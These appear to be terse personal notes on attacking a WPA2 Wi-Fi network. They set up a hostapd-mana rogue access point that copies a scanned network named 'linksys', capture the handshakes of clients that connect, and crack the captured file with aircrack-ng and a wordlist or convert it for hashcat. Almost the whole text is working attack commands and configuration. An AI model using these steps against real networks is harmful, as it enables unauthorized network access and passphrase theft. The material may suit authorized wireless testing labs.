
sudo apt install hostapd-mana


BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
11:22:33:44:55:66  -68       12        1    0   1  130   WPA2 CCMP   PSK  linksys 

cat linksys-mana.conf

interface=wlan0
ssid=linksys
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/administrator/linksys.hccapx


#start access point
sudo ip link set wlan0 up	
sudo hostapd-mana linksys-mana.conf

Wait for Captured a WPA/2 handshake in output

#CRACK
aircrack-ng linksys.hccapx -e linksys -w /usr/share/john/password.lst

hcxhash2cap --hccapx=linksys.hccapx -c out.cap
hcxpcapngtool -o hash.hc22000 -E wordlist out.cap




